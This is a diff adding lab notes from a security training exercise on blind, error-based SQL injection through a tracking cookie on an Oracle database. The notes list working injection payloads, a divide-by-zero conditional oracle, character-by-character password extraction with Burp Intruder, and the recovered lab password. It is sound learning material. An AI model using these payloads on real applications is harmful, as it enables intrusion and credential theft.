@@ -1,0 +1,39 @@
+Lab #12
+
+Vulnerable parameter - tracking cookie
+
+End goals
+    - Output admin password
+    - login as administrator
+
+    Analysis:
+
+    1. Prove that parameter is Vulnerable
+    ' after the cookie results in error, '' does not
+    ' || (select '') || ' -> causes error
+    ' || (select '' from dual) || ' -> does not.  Means it is ORACLE
+
+    2. Confirm that users table exists in database
+    ' || (select '' from users) || ' -> causes error because it is trying to return multiple rows
+    ' || (select '' from users where rownum = 1) || '
+
+    3. Confirm that the administrator user exists in the users database
+    ' || (select '' from users where username='administrator') || ' -> no difference in output if valid or invalid user
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> here is our framework.  When 1=1 perform the function with an invalid parameter.  
+    ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> If change 1=0, it will give empty string which renders fine
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' -> The "from" statement is always evaluated first.
+        If it is true, then (1=1) will be evaluated, resulting in an error due to 1 divided by 0.  If false, then the ELSE will evaluate and you will have normal output.
+
+    4. Determine length of password
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '   -> Can keep iterating
+
+    Can send to Intruder and do sniper.  Clear all the points then add point at the '1' password length.  Payload is "Number" and have it iterate 1 through 50 and step 1 each time.
+    The moment it starts getting a 200 response is the length.
+
+    5. Output the administrator password
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) = 'a') || ' 
+        This will check the first character of the password is equal to 'a'.  You can send to intruder and do cluster bomb to iterate up to the length for
+        all chars.  payload 1 is "Number" 1 through length stepping 1 each time.  Payload 2 is a simple list adding lower chars and 1s or "Brute Forcer"
+        with min/max length of 1 which does same.  500 response = correct response.
+
+        Password is: 4ral2e7qt4knu8khrf3j
